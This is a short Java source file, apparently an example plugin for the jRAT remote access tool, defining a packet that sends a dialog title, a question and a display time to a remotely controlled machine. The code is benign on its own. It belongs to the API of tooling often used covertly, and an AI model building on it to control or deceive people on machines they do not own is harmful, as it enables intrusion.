package jrat.plugin.example.client;

import java.io.DataInputStream;
import java.io.DataOutputStream;

import jrat.api.PacketBuilder;
import jrat.api.RATObject;

public class AskPacket extends PacketBuilder {

	private String title;
	private String message;
	private int seconds;

	/**
	 * Initialize packet
	 * @param rat RATObject to write to
	 * @param title Title of dialog
	 * @param message Message/Question
	 * @param i Seconds to show
	 */
	public AskPacket(RATObject rat, String title, String message, int i) {
		super(ExampleClientPlugin.HEADER, rat);
		this.title = title;
		this.message = message;
		this.seconds = i;
	}

	/**
	 * Write packet, title, message, seconds
	 */
	@Override
	public void write(RATObject rat, DataOutputStream dos, DataInputStream dis) throws Exception {
		dos.writeUTF(this.title);
		dos.writeUTF(this.message);
		dos.writeInt(seconds);
	}

}
